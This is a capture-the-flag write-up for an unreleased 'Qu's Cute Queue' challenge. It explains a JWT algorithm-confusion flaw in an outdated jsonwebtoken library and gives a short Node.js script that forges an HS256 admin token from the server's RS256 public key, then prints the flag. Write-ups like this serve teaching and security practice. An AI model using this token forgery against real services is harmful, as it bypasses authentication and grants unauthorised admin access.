# Qu's Cute Queue (200 points)
## Writeup
NOTE: Due to some very very strange issues with the challenge working locally, but not working on docker (???),
this challenge was never released. Sad! I really loved this challenge.

We're provided three files! The `index.js`, `package.json`, and `jwtRS256.key.pub`.

From the name "jwtRS256", we get a hint that this is a JWT challenge.
We can find the flag on line 103 in `index.js`, in `/adminPosts`.

The apparent solution is to forge a valid token that matches `fs.readFileSync("jwtRS256.key.pub")`.

A quick look through the package.json and a search on Snyk later, we find that jsonwebtoken is severly outdated!
Using [this vuln](https://security.snyk.io/vuln/SNYK-JS-EXPRESSJWT-575022), and the super nicely provided public key,
we can create an HS256 token with the public key.

## Script
```javascript
const jwt = require("jsonwebtoken");
const fs = require("fs");

const publicKey = fs.readFileSync("jwtRS256.key.pub");


const token = jwt.sign({admin: true}, publicKey);
console.log(token);

jwt.verify(token, publicKey, (err, decode) => {
    if (err) console.log(err);

    console.log(decode);
});
```

## Flag
`gnsCTF{dr0W5y_u53d_typ3_c0nfus10n}`
